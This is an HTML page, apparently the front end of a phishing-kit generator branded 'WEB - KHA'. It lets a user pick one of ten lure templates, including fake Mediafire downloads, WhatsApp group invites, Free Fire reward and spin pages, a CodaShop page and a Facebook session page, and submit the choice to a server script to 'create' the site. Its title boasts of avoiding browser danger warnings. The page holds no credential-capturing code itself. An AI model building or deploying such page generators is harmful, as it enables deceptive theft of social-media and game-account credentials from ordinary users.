<!DOCTYPE html>
<html lang="en">

  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <link rel="icon" href="https://i.ibb.co/0VrzQwn/Colorful-Illustrative-3-D-Robot-Artificial-Intelligence-Logo-20240425-003640-0000.png" type="image/x-icon">
        <title>Create Webp free | KHA | no delay & no merah</title>
    <style>
body {
              font-family: 'Roboto', sans-serif;
              margin: 0;
              display: flex;
              align-items: center;
              justify-content: center;
              height: 100vh;
              color: #ffffff;
              overflow: hidden;
              background-image: url('https://i.ibb.co/mydbbS3/Screenshot-20240506-225624.jpg');
              background-size: cover;
              background-position: center;
              background: linear-gradient(135deg, #, #666666);
          }
  
          .panel {
              position: relative;
              background-color: rgba(255, 255, 255, 0.4);
              padding: 25px;
              border-radius: 15px;
              box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
              max-width: 400px;
              width: 100%;
              text-align: center;
          }
  
          .panel h1 {
              font-size: 30px;
              margin-bottom: 20px;
              color: #00ECFF;
          }
  
          .panel h2 {
              margin-bottom: 20px;
              font-size: 24px;
              color: #00ECFF;
          }
  
          .option-item {
              background-color: #00ECFF;
              color: #ffffff;
              padding: 10px;
              margin-bottom: 10px;
              border-radius: 10px;
          }
  
          .option-item:hover {
              background-color: #555555;
              cursor: pointer;
          }
  
          .panel select {
              width: calc(100% - 20px);
              padding: 10px;
              margin-bottom: 20px;
              box-sizing: border-box;
              border: 2px solid #0007bcd4;
              border-radius: 10px;
              background-color: #ffffff;
              color: #00ECFF;
              font-size: 18px;
          }
  
          button {
              width: calc(100% - 20px);
              background-color: #ffffff;
              color: #00ECFF;
              padding: 10px;
              border: none;
              border-radius: 7px;
              cursor: pointer;
              font-size: 20px;
              width: 100%
              transition: background-color 0.3s ease, transform 0.2s ease;
          }
  
          button:hover {
              background-color: #fff;
              transform: translateY(-2px);
          }
  
          button:active {
              transform: translateY(0);
          }
  
          a {
              color: #fff;
          }
  
          a:hover {
              color: #00ff00;
          }
  
          .brand {
              font-size: 48px;
              margin-bottom: 20px;
          }
    </style>
  </head>

  <body>
    <div class="panel">
      <h1 class="brand">WEB - KHA</h1>
      <form action="proses.php" method="post">
        <h2>Choose Your Web 1-10:</h2>
        <select id="nomor" name="nomor" required>
          <option value="1" class="option-item">𝗠𝗲𝗱𝗶𝗮𝗳𝗶𝗿𝗲 𝗠𝗣𝟰</option>
          <option value="2" class="option-item">𝗠𝗲𝗱𝗶𝗮𝗳𝗶𝗿𝗲 𝗭𝗜𝗣</option>
          <option value="3" class="option-item">𝗚𝗿𝘂𝗽 𝗪𝗮 𝗩𝟮</option>
          <option value="4" class="option-item">𝗦𝗶𝗺𝗼𝗻𝘁𝗼𝗸 𝗡𝗼 𝗕𝘂𝗴</option>
          <option value="5" class="option-item">𝗩𝗶𝗱𝗲𝗼 𝗕𝗸𝗽</option>
          <option value="6" class="option-item">𝗖𝗼𝗱𝗮𝗦𝗵𝗼𝗽 𝗙𝗙</option>
          <option value="7" class="option-item">𝗖𝗹𝗮𝗶𝗺 𝗙𝗙</option>
          <option value="8" class="option-item">𝗙𝗙 𝗦𝗽𝗶𝗻</option>
          <option value="9" class="option-item">𝗟𝗼𝗼𝘁𝗰𝗿𝗲𝗮𝘁𝗲 𝗙𝗙</option>
          <option value="10" class="option-item">𝗦𝗲𝘀𝗶 𝗙𝗮𝗰𝗲𝗯𝗼𝗼𝗸</option>
        </select>
        <button type="submit" name="buatweb">Create Web</button>
      </form>
      </p>
    </div>
  </body>

</html>		